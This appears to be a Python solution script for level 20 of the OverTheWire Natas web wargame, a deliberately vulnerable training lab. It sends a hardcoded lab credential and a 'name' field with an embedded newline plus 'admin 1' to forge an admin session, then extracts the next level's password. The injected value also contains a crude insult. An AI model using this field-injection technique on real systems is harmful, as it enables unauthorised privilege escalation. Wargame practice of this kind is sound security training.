import requests
import re
from requests.auth import HTTPBasicAuth

with requests.Session() as session:
    r=session.post(url = "http://natas20.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"), data={"name":"gaebitch\nadmin 1"})
    #first post modifies the file
    print(r.cookies)
    print(r.text)

    ans = session.get(url = "http://natas20.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth("natas20", "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"))
    #this get lets it read from the file that we created during post
    print (ans.text)
    print(re.search('((?!guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH)[a-zA-Z0-9]{32})', ans.text).group(1))

